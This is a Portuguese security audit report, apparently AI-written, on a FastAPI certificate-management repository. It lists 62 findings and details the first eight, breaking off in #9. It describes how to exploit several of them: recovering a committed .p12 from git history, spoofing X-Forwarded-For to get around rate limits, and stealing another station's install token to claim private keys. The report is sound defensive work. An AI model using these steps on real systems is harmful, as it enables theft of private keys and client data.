# SECURITY_AUDIT.md — robot_cert

Auditoria somente-leitura do repositório `robot_cert`, feita em 24/09/2026 sobre o commit `ea9c3de` (branch `main`). Nada foi alterado, nenhuma migração rodada, nenhum endpoint de produção chamado, nenhum e-mail enviado, nenhum comando enfileirado ao agente.

**Notas de escopo, antes de tudo:**

- O roteiro pedia uma auditoria de projeto **Django**. O repositório é **FastAPI + Jinja2 + PostgreSQL** (`app/main.py`, acesso a dados por `app/db_pg.py` com uma fachada no estilo Supabase). Os conceitos foram mapeados: `DEBUG` → `ENABLE_DOCS`/`--reload`; `ALLOWED_HOSTS` → `TrustedHostMiddleware` (ausente); `SECRET_KEY` → `JWT_SECRET_KEY`; middleware de segurança → `security_headers_middleware`; ORM → `app/db_pg.py`; `manage.py` → `scripts/servir.ps1` e `Procfile`; CSRF → não se aplica (sessão por Bearer JWT, sem cookie).
- **O item 5 da lista original não chegou.** O roteiro salta do item 4 para o 6. Nada foi assumido no lugar dele. A categoria "5 — validação de entrada e path traversal" abaixo segue a numeração de 14 categorias do roteiro tal como recebido.
- Segredos encontrados aparecem apenas com arquivo, linha e valor mascarado. Nenhum valor foi copiado.
- Instruções encontradas dentro do repositório (comentários, docstrings, docs) foram lidas como dado. Nenhuma tentativa de prompt injection foi encontrada (ver seção 6, categoria 6).
- Método: cinco varreduras paralelas somente-leitura (rotas/IDOR/SSRF/fila; rate limit/contas/enumeração; entrada/SQL/XSS; cofre e segredos em repouso; configuração/segredos/downgrade/erros), seguidas de conferência manual dos achados de maior gravidade contra o código e o histórico do git.

---

## 1. Resumo executivo

O código tem base acima da média: SQL integralmente parametrizado, CSP com nonce e sem `unsafe-inline` em scripts, sessão relida do banco a cada requisição, token de instalação de uso único com compare-and-swap, chaves do cofre separadas e conferidas no boot. Os problemas graves concentram-se em três pontos: **a identidade da máquina é autenticada mas nunca usada para autorizar** (qualquer agente age em nome de qualquer estação), **a senha do PFX viaja no nome do arquivo e é armazenada em claro** no banco, na API e na tela, e **um certificado real de cliente com a senha no nome foi commitado** e permanece no histórico do git.

| Gravidade | Quantidade |
|---|---|
| Crítica | 3 |
| Alta | 17 |
| Média | 27 |
| Baixa | 15 |
| **Total** | **62** |

**Top 3:**

1. **#1 (Crítica)** — Certificado A1 real de cliente, `.p12` com a senha no nome do arquivo, está no histórico do git (commit `3175a05`, removido em `26f66e1`, blob ainda recuperável). Corrigir exige reescrever o histórico e revogar o certificado.
2. **#3 (Crítica)** — `GET /api/agent/next?machine_id=` aceita qualquer `machine_id` de qualquer credencial de agente. Quem tiver uma credencial de máquina rouba o token de instalação de outra estação e resgata as chaves privadas em `/claim`, que não autentica.
3. **#2 (Crítica)** — A senha do PFX faz parte do nome do arquivo e é gravada em claro em `cert_history.file_name` (chave primária) e nos snapshots, devolvida por `/api/certificados` a qualquer autenticado e exibida na tela Duplicidades. O cofre AES-GCM cifra a senha, mas o nome do arquivo ao lado não.

---

## 2. Tabela de achados

| # | Gravidade | Categoria | Onde | Resumo |
|---|---|---|---|---|
| 1 | Crítica | 4 | histórico git `3175a05` → `26f66e1` | `.p12` real de cliente com senha no nome commitado; blob permanece no histórico |
| 2 | Crítica | 10 | `app/settings_state.py:343,361`; `supabase/migrations/20260504_cert_history.sql:14`; `app/main.py:3043` | Senha do PFX no nome do arquivo, em claro no banco, na API e na tela |
| 3 | Crítica | 8/12 | `app/main.py:2718-2734`, `:326-338`; `supabase/migrations/20260902110000_pop_atomico_da_fila.sql:31` | `/api/agent/next` consome a fila de qualquer máquina; token vai a `/claim` sem autenticação |
| 4 | Alta | 8 | `app/main.py:4327-4374`, `:4184-4196`; `app/cert_installer.py:276-302` | `/upload-pfx` e `/api/ingest` aceitam `machine_id` e `documento` declarados pelo chamador |
| 5 | Alta | 8 | `app/main.py:3032-3043,3116-3126`, `:4024`, `:4072`, `:3525` | Acervo inteiro de clientes a qualquer autenticado (`/api/certificados`, histórico, vencidos, opções) |
| 6 | Alta | 2 | `app/main.py:5698-5709`; `app/taxa.py:97-104` | `X-Forwarded-For` aceito sem validação: todo rate limit é contornável |
| 7 | Alta | 2/3 | `app/main.py:2772-2794`, `:2823` | `/api/agent/dispositivos/registrar` verifica senha sem nenhum teto |
| 8 | Alta | 2/13 | `app/main.py:2317,2372,2399`, `:2275`; `app/senha_reset.py:48-50` | Fluxo de recuperação de senha sem limite por IP; SMTP síncrono; bomba de e-mail |
| 9 | Alta | 3 | `app/main.py:1435,1535,1590,1273`; `app/permissoes.py:298` | `usuarios:editar` cria ou promove admin e redefine senha de admin |
| 10 | Alta | 3 | `app/main.py:1374-1381` vs `:1461-1472` | Importação CSV cria contas sem `deve_trocar_senha`/`ativo` e aceita `admin` |
| 11 | Alta | 2/5 | `app/main.py:1288-1294`, `:1370-1381`, `:4907-4911`, `:4848-4850` | Importações: arquivo lido antes do teto, sem teto de linhas, bcrypt por linha, zip bomb |
| 12 | Alta | 2 | `app/main.py:3340-3365`, `:3704`; `app/permissoes.py:121,142` | `/duplicidades` O(n²) com `SequenceMatcher`, sem cache, aberto a todo papel |
| 13 | Alta | 7 | `static/ui-common.js:482-486`; `templates/index.html:598,872` e ~28 usos | `esc()` não escapa aspas e é usado dentro de atributos HTML |
| 14 | Alta | 7 | `templates/index.html:969-973`; `historico.html:337-340`; `vencidos.html:457-460` | Injeção de fórmula em CSV exportado no cliente |
| 15 | Alta | 11 | `app/smtp_service.py:92-95,124-131`; `app/main.py:2109-2111` | SMTP sem verificação de certificado; opção "Nenhuma" manda credencial em claro |
| 16 | Alta | 5/9 | `app/main.py:2181-2182`, `:4218-4243`, `:3043`; `app/settings_state.py:57-67`; `app/cert_scanner.py:147-167` | Pastas de origem/vencidos arbitrárias: leitura e movimentação de PFX, UNC, DoS por `rglob` |
| 17 | Alta | 4 | `.env` (não rastreado) | Segredos locais de baixa entropia (`API_KEY` 11 chars, `JWT_SECRET_KEY` frase, chave Supabase obsoleta) |
| 18 | Alta | 4/10 | `templates/configuracao.html:588-605`; `agent_setup.iss:31`; `agent/run_agent.py:240-291,639-642` | Chave do agente em claro em `agent_config.json` na pasta do programa |
| 19 | Alta | 10 | `app/cert_installer.py:107-114` vs `:137-150` | Senha do PFX cifrada sem `key_version`: rotação da chave de senha quebra o cofre |
| 20 | Alta | 4 | `.gitignore:15-16` | `.gitignore` sem `*.p12`, `*.pem`, `*.key`, `agent_config.json`, `certificados/` |
| 21 | Média | 8 | `app/main.py:5723-5776`; `app/cert_installer.py:1468` | `/claim` não confere `target_machine` nem quem apresenta o token |
| 22 | Média | 3 | `app/main.py:1611-1654`, `:1706-1713` | Desativar/excluir usuário não revoga tokens de instalação pendentes |
| 23 | Média | 3/12 | `app/auth.py:10-11`; `static/ui-common.js:12,41-47` | JWT de 24 h sem `jti`/revogação, em `localStorage`, logout só no cliente |
| 24 | Média | 3 | `app/main.py:1600-1606` vs `:2431-2441` | `reset_user_password` não carimba `senha_alterada_em` |
| 25 | Média | 3/10 | `app/main.py:1398,1597`; `app/auth.py:71-77` | Senha mínima de 6, sem outras regras, `6` duplicado; sem teto de 72 bytes do bcrypt |
| 26 | Média | 13 | `app/main.py:1138` | Oráculo de timing no login: bcrypt pulado quando a conta não existe |
| 27 | Média | 13 | `app/main.py:1150` vs `:1160` | Login responde 403 "Usuário desativado", distinguindo estado da conta |
| 28 | Média | 2 | `app/main.py:2546-2569`, `:2608-2614`, `:4207`; `app/smtp_service.py:120,136` | `/smtp/test`, `/alerts/trigger` e `/ingest`→alertas sem teto; destinatário não validado |
| 29 | Média | 2/5 | `app/main.py:995-1000`, `:954-963`, `:1101`, `:4312`, `:5803`, `:3083-3084` | Modelos Pydantic sem limites; `/api/certificados` sem paginação por padrão |
| 30 | Média | 8 | `app/main.py:5294-5323`, `:4406-4429`; `app/cert_installer.py:780-853` | `/instalabilidade` e `/vault-optin` com `machine_id` livre: enumeração cruzada de estações |
| 31 | Média | 8 | `app/main.py:5916-5931`; `app/cert_installer.py:1672,1688` | Trilha e logs expõem e-mail e IP de outros operadores; `user_email` é filtro livre |
| 32 | Média | 8 | `app/main.py:5889-5913`; `app/cert_installer.py:312` | `/available` lista o cofre inteiro sem filtro de carteira |
| 33 | Média | 9 | `app/main.py:2183-2184`, `:2546-2566`; `app/smtp_service.py:118-124` | SSRF por host/porta SMTP: conexão TCP arbitrária a partir do servidor, com erro devolvido |
| 34 | Média | 6 | `app/main.py:3161`, `:3920-3925`, `:3972`; `app/db_pg.py:280-301,467` | Injeção na DSL `or_` via vírgula em `?busca=`; erro de SQL devolvido ao cliente |
| 35 | Média | 14 | `app/main.py:1383-1384`, `:3153-3158`, `:2567-2568`, `:5462` e 37× `detail=str(e)` | Erros internos, de banco e de SMTP devolvidos crus ao cliente |
| 36 | Média | 1 | `app/main.py:612-682` | Sem `TrustedHostMiddleware`: `Host` arbitrário aceito |
| 37 | Média | 11 | `app/main.py:632`; `Procfile` | HSTS emitido, mas nenhum redirecionamento HTTP→HTTPS nem proxy no repositório |
| 38 | Média | 1/11 | `docs/GUIA_MIGRACAO_WINDOWS_SERVER.md:161,174`; `scripts/setup_porta_servidor.ps1:8,37,147` | Documentação e script orientam HTTP em `0.0.0.0` |
| 39 | Média | 9/11 | `agent/run_agent.py:52,339-363` | Agente segue redirect para outro host mantendo `X-API-Key`; `base_url` não exige https |
| 40 | Média | 11 | `app/main.py:5369-5373,5608-5619`; `app/config.py:129` | Ponte INVENT não exige https; `CERT_PORTAL_TOKEN` e token bruto viajam nela |
| 41 | Média | 11 | `app/main.py:318` | Comparação da `X-API-Key` não é de tempo constante |
| 42 | Média | 10 | `app/cert_installer.py:47,59-62`; `app/config.py:78-86`; `app/main.py:1107-1152,5271` | Rotação do cofre: `V1` inalcançável, versões antigas aceitas sem recifrar, ajuda promete mais |
| 43 | Média | 10 | `agent/installer_client.py:195-213` | Senha do PFX na linha de comando do `certutil` |
| 44 | Média | 10 | `agent/installer_client.py:316` | Agente grava o token de instalação inteiro no log |
| 45 | Média | 4 | `agent_setup.iss:52` | Instalador concede `users-modify` na pasta que guarda `maquina.dat` |
| 46 | Média | 4 | `static/ui-common.js:12,28,42`; `templates/configuracao.html:468-478,577-578` | API key guardada em `localStorage` sob a mesma chave do JWT |
| 47 | Média | 2 | `app/taxa.py:108-116` | Rate limit degrada para memória de instância sem sinalizar |
| 48 | Baixa | 1/13 | `app/main.py:1993-2030` | `/api/health` público descreve a postura de segurança do deploy |
| 49 | Baixa | 7/1 | `app/main.py:642-664` | CSP sem `base-uri`, `style-src 'unsafe-inline'`, relaxamento via `IMPECCABLE_LIVE` |
| 50 | Baixa | 14 | `app/main.py:670-673` | Remoção do cabeçalho `Server` é ineficaz no uvicorn |
| 51 | Baixa | 11 | `app/db_pg.py:515-525`; `app/config.py:187-188` | DSN do PostgreSQL sem `sslmode` |
| 52 | Baixa | 13/14 | `app/main.py:1425-1432`, `:1371-1373`, `:4969-4982` | 409 ecoa o e-mail; importações distinguem "existe" de "criado" |
| 53 | Baixa | 14 | `app/main.py:4237-4239` | `/api/mover-vencidos` devolve caminhos absolutos do servidor |
| 54 | Baixa | 5/6 | `app/main.py:4068`, `:3166`, `:3960,3975` | `de`/`ate` sem validação (vira `datetime.min`); `busca` ignorada no export do histórico |
| 55 | Baixa | 10 | `app/cert_installer.py:99,126,194` | AES-GCM sem dados associados (AAD) |
| 56 | Baixa | 10 | `app/senha_reset.py:63-64` | Código de redefinição em SHA-256 sem sal |
| 57 | Baixa | 10/14 | `app/main.py:483-502` | `SecureJSONFormatter` apaga a mensagem inteira e não redige `exc_info` |
| 58 | Baixa | 10 | `agent/installer_client.py:133-138,307,398` | Agente loga `file_name` (com senha) e `resp.text` |
| 59 | Baixa | 1 | `scripts/servir.ps1:15` | Script de serviço sobe com `--reload` |
| 60 | Baixa | 2 | `app/main.py:5638`, `:5488`, `:5276` | `/redeem`, `/acompanhar`, `/revalidar-cofre` sem teto |
| 61 | Baixa | 8 | `app/main.py:4734` | `/api/carteira/documentos` devolve o universo de clientes a qualquer líder |
| 62 | Baixa | 12 | `app/cert_installer.py:1893`; `app/main.py:2617,2665-2673`, `:5916` | Código morto que enfileira token; `GET /api/cron/alerts` muta estado; `/logs` sem consumidor |

---

## 3. Achados

### #1 — Crítica — Certificado A1 real de cliente com senha no nome está no histórico do git

**O que é.** O commit `3175a05` ("Fix bugs e prepara para Render", 23/04/2026) adicionou o arquivo binário `certificados/AUTO POSTO A••• LTDA_1899••••0190 SENHA••••.p12` (9.117 bytes) e, no mesmo commit, **removeu** a linha `*.p12` do `.gitignore`. O commit `26f66e1` apagou o arquivo da árvore, mas o blob `43779ce` continua alcançável no histórico. O nome do arquivo carrega a senha do PFX, portanto o histórico contém chave privada e senha juntas.

**Evidência.**

```
$ git show --stat 3175a05
 .gitignore                                               |   1 -
 certificados/AUTO POSTO A••• LTDA_1899••••0190 SENHA•••• | Bin 0 -> 9117 bytes
$ git show --stat 26f66e1
 certificados/AUTO POSTO A••• LTDA_1899••••0190 SENHA•••• | Bin 9117 -> 0 bytes
```

O `.gitignore` atual (`.gitignore:15`) tem `*.pfx` mas **não** tem `*.p12` (ver #20).

**Como seria explorado.** Qualquer pessoa com leitura do repositório (clone, fork, backup, mirror, colaborador antigo) roda `git show 43779ce > cert.p12` e usa a senha do nome. Com o A1 assina documentos, acessa e-CAC/NF-e em nome do cliente, até o vencimento do certificado.

**Impacto.** Comprometimento de chave privada de terceiro. É incidente com dever de comunicação ao titular (LGPD) e revogação junto à AC, independentemente de o repositório ser privado.

**Correção sugerida.** Não é código. Em ordem:

1. Revogar o certificado na AC emissora e avisar o cliente.
2. Reescrever o histórico e forçar o push (todos os clones precisam ser refeitos):

```powershell
# com git-filter-repo instalado (pip install git-filter-repo)
git filter-repo --invert-paths --path-glob 'certificados/*.p12' --path-glob '*.p12'
git push --force --all
git push --force --tags
# no remoto: expirar reflog e rodar gc, ou abrir/fechar o repositório (GitHub: suporte)
```

3. Fechar o `.gitignore` (#20) e adicionar um hook de pré-commit que recuse binários `.p12/.pfx/.pem/.key`.

**Como testar.** Após o rewrite: `git log --all --diff-filter=A --name-only | Select-String -Pattern '\.p12$|\.pfx$'` deve voltar vazio, e `git cat-file -t 43779ce` deve falhar.

---

### #2 — Crítica — Senha do PFX no nome do arquivo, gravada em claro no banco e devolvida pela API e pela tela

**O que é.** A convenção operacional é nomear o PFX como `<TITULAR>_<CNPJ> SENHA<senha>.pfx` (o arquivo do achado #1 prova a convenção). O portal usa esse nome como identidade do certificado: `file_name` é a **chave primária** de `cert_history` e vai inteiro para `cert_snapshots.items[].path`. O cofre cifra `pfx` e `senha` com AES-256-GCM, mas a mesma senha fica em claro na coluna ao lado, é devolvida por várias rotas e aparece copiável na tela Duplicidades.

**Evidência.**

- Gravação: `app/settings_state.py:343` (`file_name = str(it.get("file_name")...)`), `:361` (`"file_name": file_name` no `rows.append`); `supabase/migrations/20260504_cert_history.sql:14` (`file_name text primary key`).
- Exposição pela API: `app/main.py:3043` (`/api/certificados`, guarda `require_auth`, qualquer papel, devolve `file_name` e `path`); `app/main.py:3225,3235` (`/api/certificados/duplicidades`); `app/main.py:3865,3910,3924,3943` (`/api/certificados/historico`); `app/cert_scanner.py:253`.
- Exposição na tela: `templates/duplicidades.html:286-306` e `:331,347` (nome e caminho do arquivo listados e copiáveis).
- Log do agente: `agent/installer_client.py:133-138` grava `c.file_name`.
- Não expostos (conferido): exportações CSV/PDF, e-mails de alerta, ponte INVENT, lista de custódia do Instalador.

**Como seria explorado.** Um operador comum (papel `user`) chama `GET /api/certificados?todas_filtradas=true` (ver #5) e recebe até 5.000 itens com `file_name` e `path`; cada linha traz a senha do PFX correspondente. Com acesso de leitura ao banco (backup, dump, `pg_dump` de suporte) o mesmo dado sai de `cert_history`. Combinado com o #16 (mover PFX para uma pasta controlada) ou com o #3, chave e senha ficam juntas.

**Impacto.** Anula a proteção do cofre: a senha existe cifrada e em claro no mesmo banco. Abrange todo o acervo.

**Correção sugerida.** Dois passos: parar de expor e parar de armazenar.

```python
# app/cert_scanner.py — ao montar o item, separar identidade de nome de arquivo
import re
_SENHA_NO_NOME = re.compile(r"\s*SENHA\S*", re.IGNORECASE)

def nome_publico(file_name: str) -> str:
    """Nome sem o sufixo de senha. É o que sai para API, tela e histórico."""
    return _SENHA_NO_NOME.sub("", file_name).strip()

def chave_do_arquivo(file_name: str) -> str:
    """Identidade estável para deduplicação, sem carregar a senha."""
    return hashlib.sha256(nome_publico(file_name).encode("utf-8")).hexdigest()
```

```python
# app/settings_state.py:343-361 — gravar o nome público e a chave; nunca o nome cru
file_name_pub = nome_publico(file_name)
rows.append({
    "file_name": file_name_pub,          # PK continua text, mas sem a senha
    "arquivo_chave": chave_do_arquivo(file_name),
    ...
})
```

E, em `_list_certificados_payload` e nas rotas de duplicidades/histórico, devolver `nome_publico(...)` e remover `path` para quem não é admin. A senha, quando o agente precisa dela, já está no cofre (`cert_pfx_store.senha_cifrada`); o agente deve ler o PFX pela senha do cofre, não pelo nome. Migração de dados: `UPDATE cert_history SET file_name = regexp_replace(file_name, '\s*SENHA\S*', '', 'i')` com tratamento de colisão de PK, e o mesmo em `cert_snapshots.items`.

**Como testar.**

```python
def test_api_nunca_devolve_senha_no_nome(client, token_user, snapshot_com_senha_no_nome):
    r = client.get("/api/certificados?todas_filtradas=true", headers=bearer(token_user))
    corpo = r.text.upper()
    assert "SENHA" not in corpo
    assert '"path"' not in r.text
```

E `SELECT count(*) FROM cert_history WHERE file_name ILIKE '%senha%'` deve ser 0 após a migração.

---

### #3 — Crítica — `/api/agent/next` consome a fila de qualquer máquina; o token vai direto a `/claim`, que não autentica

**O que é.** A credencial de máquina identifica a estação, mas o `TokenData` construído descarta essa identidade (não tem campo `machine_id`). O `machine_id` usado para consumir a fila vem só da querystring. Qualquer agente autenticado, ou qualquer portador da `X-API-Key` compartilhada, faz polling na fila de outra estação, recebe o token de instalação e o troca pelas chaves privadas em `/claim`, que aceita apenas o token como credencial.

**Evidência.**

```python
# app/main.py:2718-2722
@app.get("/api/agent/next", dependencies=[Depends(require_agent_or_admin)])
def agent_next_command(
    machine_id: str = Query("default", description="ID da máquina do agente"),
) -> dict:
```

```python
# app/main.py:326-338 (dentro de require_auth) — a identidade da máquina é descartada
maquina = machine_credentials.autenticar(x_api_key)
...
if maquina:
    return auth.TokenData(email="agent@internal", role="agent")
```

`app/auth.py:44-60`: `TokenData` não tem `machine_id`. `supabase/migrations/20260902110000_pop_atomico_da_fila.sql:31` filtra por `machine_id = p_machine_id`, o parâmetro vindo da query. `app/command_queue.py:59-64`: `*`/`all`/`qualquer` são curingas, entregues ao primeiro que perguntar. `app/main.py:5723-5776`: `/claim` sem `Depends`, só o token.

**Como seria explorado.**

1. Atacante com uma credencial de máquina válida (estação comprometida, ou a `X-API-Key` compartilhada, ainda aceita em `app/main.py:318`) faz `GET /api/agent/next?machine_id=<id-da-vítima>` a cada segundo.
2. Um operador legítimo clica "Instalar nesta máquina"; `/prepare` emite o token e o INVENT enfileira para a máquina da vítima.
3. O atacante vence a corrida, recebe `{"command":"instalar_certificados","payload":"<token>"}` e o comando some da fila (`pop`).
4. `POST /api/cert-installer/claim` com o token devolve o bundle ECDH com as chaves privadas A1.

**Impacto.** Exfiltração de chaves privadas de clientes por qualquer estação com credencial. Negação de serviço silenciosa para a vítima (o comando nunca chega).

**Correção sugerida.**

```python
# app/auth.py
class TokenData(BaseModel):
    ...
    machine_id: Optional[str] = None   # preenchido só no caminho de credencial de máquina

# app/main.py — require_auth
if maquina:
    return auth.TokenData(email="agent@internal", role="agent",
                          machine_id=str(maquina.get("machine_id") or ""))

# app/main.py — /api/agent/next
@app.get("/api/agent/next")
def agent_next_command(machine_id: str = Query("default"),
                       token: auth.TokenData = Depends(require_agent_or_admin)) -> dict:
    pedido = (machine_id or "").strip().lower()
    if token.role != "admin":
        propria = (token.machine_id or "").strip().lower()
        if not propria:
            raise HTTPException(403, "Migre esta estação para credencial de máquina.")
        if pedido != propria:
            raise HTTPException(403, "Esta fila não é desta máquina.")
    q = pop_next_for_agent(pedido)
```

Complementos: recusar a `X-API-Key` compartilhada nas rotas de fila; em `/claim`, conferir `target_machine` contra a credencial de máquina do chamador (#21).

**Como testar.**

```python
def test_agente_nao_pop_comando_de_outra_maquina(client, cred_maquina_A):
    command_queue.enqueue("MAQ-B", "instalar_certificados", payload="tok")
    r = client.get("/api/agent/next?machine_id=MAQ-B", headers={"X-API-Key": cred_maquina_A})
    assert r.status_code == 403
    assert any(c["machine_id"] == "MAQ-B" for c in command_queue.list_pending())
```

---

### #4 — Alta — `/upload-pfx` e `/api/ingest` aceitam `machine_id` e `documento` declarados pelo chamador (envenenamento do cofre)

**O que é.** A barreira de custódia (`fingerprints_autorizados`) é avaliada contra o `machine_id` que o chamador declarou, e o inventário que alimenta essa barreira também é escrito com `machine_id` declarado. `upsert_pfx` grava `documento` como veio do agente, sem conferir contra o PFX, e `documento` é a chave que `assegurar_carteira` compara com a carteira do operador.

**Evidência.** `app/main.py:4327-4374` (`upload_pfx`, `autorizados = cert_installer.fingerprints_autorizados(body.machine_id)`); `app/main.py:4184-4196` (`ingest`, `machine_id = body.machine_id.strip() or "default"`); `app/cert_installer.py:276-283` (`upsert_pfx` grava `documento` do corpo), `:302` (`on_conflict="machine_id,fingerprint"`), `:419-460` (`fingerprints_do_inventario`).

**Como seria explorado.** Agente comprometido: (1) `POST /api/ingest` com `machine_id="MAQ-VITIMA"` e item forjado (fingerprint `FP_X`, status `ok`); (2) `POST /upload-pfx` com o mesmo `machine_id`, `FP_X`, PFX do atacante e `documento` = CNPJ de um cliente da carteira do alvo, passando na custódia e substituindo material legítimo; (3) o operador vê o item como instalável, pede `/prepare` e o certificado do atacante é instalado como não-exportável na estação dele.

**Impacto.** Substituição de material criptográfico no cofre; instalação de certificado forjado em estação de terceiro; corrupção do inventário da vítima.

**Correção sugerida.**

```python
def _machine_da_credencial(token: auth.TokenData, declarado: str) -> str:
    if token.role == "admin":
        return (declarado or "").strip().lower()
    propria = (token.machine_id or "").strip().lower()
    if not propria:
        raise HTTPException(403, "Estação sem credencial de máquina própria.")
    if (declarado or "").strip().lower() not in ("", propria):
        raise HTTPException(403, "machine_id não confere com a credencial.")
    return propria
# em upload_pfx e ingest: machine_id = _machine_da_credencial(token, body.machine_id)
```

Em `upsert_pfx`, derivar `documento`, `subject` e `not_after` do próprio PFX (já se tem bytes e senha) ou recusar `documento` divergente do já registrado para aquele fingerprint.

**Como testar.** Credencial de `MAQ-A` chamando `/upload-pfx` e `/api/ingest` com `machine_id="MAQ-B"` → 403, e o snapshot/cofre de `MAQ-B` intacto.

---

### #5 — Alta — Acervo inteiro de clientes a qualquer autenticado

**O que é.** `/api/certificados` é a única rota fora da matriz de permissões (decisão registrada em comentário) e não filtra por carteira. Com `todas_filtradas=true` devolve até 5.000 itens com titular, CNPJ/CPF, subject, issuer, serial, fingerprint, `file_name` e `path`. As exportações PDF/Excel são feitas no cliente a partir dessa resposta. O mesmo vale para `historico` e `vencidos` com `todas_filtradas`, e para `/api/colaborador/certificados/opcoes`, que lista o universo a quem tem `acompanhamento: ler` (padrão de `user` e `gestor`).

**Evidência.** `app/main.py:3032-3043` (comentário e decorador `require_auth`), `:3116-3126` (`filtered[:LISTAGEM_EXPORT_MAX]`), `:511` (`LISTAGEM_EXPORT_MAX = 5000`), `:4024`, `:4072`, `:3525`. Nenhuma referência a `carteira`/`listar_carteira`/`user_id` no corpo da rota.

**Como seria explorado.** Operador comum: `GET /api/certificados?todas_filtradas=true` com o próprio Bearer. Uma requisição, base inteira.

**Impacto.** Vazamento da base comercial e pessoal de clientes (LGPD) a qualquer conta. Convive mal com `assegurar_carteira`, que impede instalar fora da carteira mas não impede ler tudo.

**Correção sugerida.**

```python
@app.get("/api/certificados")
def listar_certificados(..., token: auth.TokenData = Depends(require_auth)):
    ...
    papel = (token.role or "").strip().lower()
    if papel != "agent" and papel not in cert_installer.PAPEIS_COM_ALCANCE_TOTAL:
        try:
            minha = cert_installer.listar_carteira(_user_id_da_sessao(token) or "")
        except cert_installer.CarteiraIndisponivel:
            raise HTTPException(503, "Não foi possível verificar sua carteira.")
        base["itens"] = [it for it in base["itens"]
                         if cert_installer.so_digitos(it.get("documento_numero")) in minha]
```

Mesmo recorte em `historico`, `vencidos` e `opcoes`; remover `path` para não-admin.

**Como testar.** `test_operador_so_ve_a_propria_carteira`: os `documento_numero` devolvidos a um `user` com carteira de um documento são subconjunto dessa carteira.

---

### #6 — Alta — `X-Forwarded-For` aceito sem validação: todo rate limit é contornável

**O que é.** `_ip_do_cliente` usa o **primeiro** valor de `X-Forwarded-For`, que é o que o cliente escreveu; proxies anexam o IP real ao final, não substituem. Todos os três pontos de 429 do sistema usam essa função.

**Evidência.** `app/main.py:5698-5709`:

```python
encaminhado = (request.headers.get("x-forwarded-for") or "").split(",")[0].strip()
if encaminhado:
    return encaminhado
```

Usos: `app/main.py:1174` (login 20/60 s), `:5737` (claim 10/60 s), `:5832` (report-avulso). `app/taxa.py:97-99` insere a chave em `rate_limit_tentativas`; a poda (`:104`) é `.eq("chave", chave)`, então chaves novas nunca são podadas.

**Como seria explorado.** `X-Forwarded-For: 1.2.3.<n>` com `n` aleatório por requisição. Login e `/claim` voltam a ser ilimitados; a tabela de tentativas cresce sem teto.

**Impacto.** Password spraying e força bruta do token de instalação viáveis; crescimento ilimitado de tabela.

**Correção sugerida.**

```python
# app/config.py
NUM_PROXIES_CONFIAVEIS = _env_int("NUM_PROXIES_CONFIAVEIS", default=1, lo=0, hi=5)

# app/main.py
def _ip_do_cliente(request: Request) -> str:
    socket_ip = request.client.host if request.client else "desconhecido"
    n = config.NUM_PROXIES_CONFIAVEIS
    if n <= 0:
        return socket_ip
    cadeia = [p.strip() for p in (request.headers.get("x-forwarded-for") or "").split(",") if p.strip()]
    return cadeia[-n] if len(cadeia) >= n else socket_ip
```

**Como testar.** 100 POSTs a `/api/login` com `X-Forwarded-For: 9.9.9.{i}` distintos devem produzir ao menos um 429 (hoje produzem zero).

---

### #7 — Alta — `/api/agent/dispositivos/registrar` verifica senha sem nenhum teto

**O que é.** A rota é anônima, chama a mesma `_conferir_credenciais` do login e não passa por `taxa.permitir`. O teto de 20/min do login é decorativo. Um registro bem-sucedido devolve um segredo durável que se troca por JWT com o papel real da pessoa, inclusive `admin`. `/api/agent/dispositivos/token` (`:2823`) tem o mesmo laço sem teto (segredo de 32 bytes, força bruta inviável, mas I/O gratuito).

**Evidência.** `app/main.py:2772-2778`:

```python
@app.post("/api/agent/dispositivos/registrar")
def registrar_dispositivo(body: RegistrarDispositivoBody, request: Request) -> dict:
```

`app/main.py:2794` (`user = _conferir_credenciais(body.email, body.password, ip)`), `:2813` (segredo devolvido), `:2859` (JWT com papel real).

**Como seria explorado.** Spraying de senhas contra esta rota, sem 429; combinado com #26 (oráculo de timing), enumeração de contas ilimitada.

**Impacto.** Tomada de conta, inclusive admin; crescimento de `agent_devices`.

**Correção sugerida.**

```python
ip = _ip_do_cliente(request)
if not taxa.permitir(f"login:{ip}", 20, 60):          # MESMA chave do /api/login
    raise HTTPException(status_code=429, detail="Muitas tentativas. Aguarde um minuto.")
if not taxa.permitir(f"senha:{(body.email or '').strip().lower()}", 10, 300):  # teto por conta
    raise HTTPException(status_code=429, detail="Muitas tentativas nesta conta.")
```

**Como testar.** 25 POSTs com senha errada do mesmo IP → 429; 21 tentativas alternando `/api/login` e `/registrar` → o 21º é 429.

---

### #8 — Alta — Recuperação de senha sem limite por IP; SMTP síncrono; bomba de e-mail e oráculo de timing

**O que é.** `/api/senha/codigo`, `/verificar` e `/redefinir` não chamam `taxa.permitir`. As barreiras existentes (`MAX_PEDIDOS_HORA = 3`, `MAX_TENTATIVAS = 3`) são por conta. O e-mail é enviado de forma síncrona dentro do request.

**Evidência.** `app/main.py:2317`, `:2372`, `:2399` (sem `taxa`); `:2275` (`_enviar_codigo_por_email` síncrono); `:2337-2341` (conta inexistente responde na hora); `app/senha_reset.py:48-50`, `:88-90`; `app/smtp_service.py:125-136` (`timeout=10`); `app/db_pg.py:515` (`max_size=6`).

**Como seria explorado.** (1) Lista de e-mails do domínio → 3×N e-mails/hora pelo SMTP corporativo, sem autenticação. (2) Conta existente faz duas escritas e uma conexão SMTP antes de responder; inexistente responde imediatamente: a resposta genérica não esconde nada. (3) Dezenas de requisições concorrentes prendem o pool de 6 conexões por até 10 s cada.

**Impacto.** Consumo de cota SMTP e reputação do domínio; enumeração de contas; indisponibilidade.

**Correção sugerida.**

```python
@app.post("/api/senha/codigo")
def senha_pedir_codigo(body, request: Request, background: BackgroundTasks) -> dict:
    ip = _ip_do_cliente(request)
    if not taxa.permitir(f"reset-ip:{ip}", 5, 3600):
        return {"ok": True, "message": RESPOSTA_GENERICA}   # 200, não 429: 429 já sinaliza
    ...
    background.add_task(_enviar_codigo_por_email, conta, codigo)  # SMTP fora da resposta
    return {"ok": True, "message": RESPOSTA_GENERICA}
```

E `taxa.permitir(f"reset-verif:{ip}", 20, 3600)` em `/verificar` e `/redefinir`.

**Como testar.** 6 POSTs do mesmo IP com e-mails diferentes → o 6º não chama o mock de SMTP; mediana de tempo entre e-mail existente e inexistente < 30 ms.

---

### #9 — Alta — `usuarios:editar` cria ou promove admin e redefine senha de admin

**O que é.** `POST /api/users`, `PUT /api/users/{id}`, `POST /api/users/import` validam `role ∈ PAPEIS_VALIDOS` (que inclui `admin`) e nada mais. `reset-password` redefine a senha de qualquer conta sem olhar o papel do alvo. Hoje só admin tem `usuarios:editar`, mas a matriz é editável pela tela para `gestor` e `user`, e nada avisa que esse nível equivale a admin.

